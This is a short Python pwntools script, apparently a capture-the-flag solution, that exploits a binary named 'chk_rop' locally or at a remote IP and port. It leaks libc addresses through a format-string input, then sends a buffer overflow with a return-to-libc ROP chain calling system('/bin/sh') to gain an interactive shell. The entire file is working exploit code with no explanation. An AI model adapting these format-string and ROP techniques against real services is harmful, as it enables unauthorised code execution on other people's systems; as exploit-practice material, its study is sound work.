#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./chk_rop')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('47.106.94.13', 50008)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

rop_rdi_ret = 0x4009d3
# gdb.attach(p, "b *0x40096A\nc")
p.sendafter('Give you a gift...\n', '%p%p%p%p')
p.recvuntil('0x')
p.recvuntil('0x')

libcbase = int(p.recvuntil('0x')[: -2], 16) - 0x10 - libc.sym['read']
addr_system = libcbase + libc.sym['system']
addr_bin_sh = libcbase + libc.search('/bin/sh').next()

p.sendlineafter('Tell me U filename\n', '123456789abcded')
pd = 'a' * 0x58
pd += p64(rop_rdi_ret)
pd += p64(addr_bin_sh)
pd += p64(addr_system)
p.sendlineafter('And the content:\n', pd)
p.interactive()
